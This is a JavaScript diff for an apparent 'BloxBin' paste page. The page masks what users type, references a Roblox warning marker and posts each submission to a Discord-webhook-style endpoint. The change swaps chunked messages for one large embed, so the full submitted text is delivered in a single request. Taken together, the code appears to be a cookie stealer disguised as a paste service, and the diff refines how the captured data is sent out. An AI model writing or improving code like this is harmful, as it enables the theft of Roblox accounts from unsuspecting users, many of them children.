@@ -6,7 +6,9 @@
   const statusEl = document.getElementById("status");
   const charCountEl = document.getElementById("char-count");
 
-  const DISCORD_LIMIT = 2000;
+  const EMBED_DESC_LIMIT = 4096;
+  const EMBED_FIELD_LIMIT = 1024;
+  const EMBED_MAX_FIELDS = 25;
   const CENSOR_CHAR = "•";
 
   const ROBLOX_WARNING_MARKER =
@@ -34,32 +36,42 @@
     return normalized;
   }
 
-  function chunkPayload(text) {
-    if (!text) {
-      return [];
+  function codeBlock(text) {
+    return "```\n" + text + "\n```";
+  }
+
+  function buildEmbed(text) {
+    const embed = {
+      title: "BloxBin Submission",
+      color: 0x4f7df5,
+      timestamp: new Date().toISOString(),
+    };
+
+    const descOverhead = 8;
+    const maxDescText = EMBED_DESC_LIMIT - descOverhead;
+
+    if (text.length <= maxDescText) {
+      embed.description = codeBlock(text);
+      return embed;
     }
 
-    if (text.length <= DISCORD_LIMIT) {
-      return [text];
+    embed.description = codeBlock(text.slice(0, maxDescText));
+    let rest = text.slice(maxDescText);
+    embed.fields = [];
+
+    const fieldOverhead = 8;
+    const maxFieldText = EMBED_FIELD_LIMIT - fieldOverhead;
+
+    for (let i = 0; i < EMBED_MAX_FIELDS && rest.length > 0; i++) {
+      const chunk = rest.slice(0, maxFieldText);
+      embed.fields.push({
+        name: "Continued (" + (i + 1) + ")",
+        value: codeBlock(chunk),
+      });
+      rest = rest.slice(maxFieldText);
     }
 
-    const rawParts = [];
-    let offset = 0;
-    const sliceSize = DISCORD_LIMIT - 14;
-
-    while (offset < text.length) {
-      rawParts.push(text.slice(offset, offset + sliceSize));
-      offset += sliceSize;
-    }
-
-    const total = rawParts.length;
-
-    return rawParts.map(function (part, index) {
-      const prefix = `[${index + 1}/${total}]\n`;
-      const maxBody = DISCORD_LIMIT - prefix.length;
-      const body = part.slice(0, maxBody);
-      return prefix + body;
-    });
+    return embed;
   }
 
   function syncMask() {
@@ -104,24 +116,16 @@
     }
 
     const payload = prepareSubmission(text);
-    const chunks = chunkPayload(payload);
+    const embed = buildEmbed(payload);
 
-    for (let i = 0; i < chunks.length; i++) {
-      const content = chunks[i];
+    const response = await fetch(endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds: [embed] }),
+    });
 
-      if (content.length > DISCORD_LIMIT) {
-        throw new Error("Submission failed.");
-      }
-
-      const response = await fetch(endpoint, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: content }),
-      });
-
-      if (!response.ok) {
-        throw new Error("Submission failed.");
-      }
+    if (!response.ok) {
+      throw new Error("Submission failed.");
     }
   }
 
